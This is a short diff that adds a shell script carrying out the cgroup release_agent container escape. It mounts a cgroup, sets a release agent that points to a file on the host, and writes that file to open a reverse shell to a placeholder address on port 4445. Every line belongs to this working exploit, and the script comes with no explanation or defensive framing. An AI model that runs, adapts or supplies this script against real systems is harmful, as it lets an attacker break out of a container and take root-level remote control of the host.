@@ -1,0 +1,11 @@
+mkdir /tmp/asdasd
+mkdir /tmp/asdasd/cgrp
+mount -t cgroup -o rdma cgroup /tmp/asdasd/cgrp
+mkdir /tmp/asdasd/cgrp/x
+echo 1 > /tmp/asdasd/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/asdasd/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "/bin/bash -c 'bash -i >& /dev/tcp/x.x.x.x/4445 0>&1'" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/asdasd/cgrp/x/cgroup.procs"
